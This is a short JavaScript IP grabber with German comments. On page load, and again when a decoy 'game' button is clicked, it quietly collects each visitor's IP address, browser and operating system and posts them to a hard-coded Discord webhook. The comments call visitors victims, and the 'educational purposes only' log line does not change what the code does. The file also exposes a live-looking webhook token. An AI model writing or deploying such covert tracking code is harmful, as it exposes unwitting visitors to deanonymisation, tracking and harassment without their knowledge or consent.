// Discord-Webhook-URL (ersetze mit DEINEM Webhook!)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1388941060230746323/Zy4sYUKkkezroh5UabIvGLHP5Vfe3BZQ5uvwOMkWyxKqPdJWoYKcQt3sxp6dfcWy-kvL";

// Funktion, um die IP zu loggen
async function logIP() {
    try {
        // Schritt 1: IP des Besuchers abfragen (über ipify API)
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Schritt 2: Browser-Infos sammeln
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;

        // Schritt 3: An Discord senden
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🔥 NEUER BESUCHER! 🔥\nIP: ${userIP}\nBrowser: ${userAgent}\nOS: ${platform}`
            })
        });

        console.log("IP erfolgreich geloggt (nur für Bildungszwecke!)");
    } catch (err) {
        console.error("Fehler beim IP-Logging:", err);
    }
}

// IP sofort loggen, wenn die Seite lädt
logIP();

// Bonus: IP auch beim Button-Klick loggen
document.getElementById("secret-btn").addEventListener("click", () => {
    alert("SKIBIDI GAME COMING SOON... 😈");
    logIP(); // Nochmal loggen für "interaktive" Opfer
});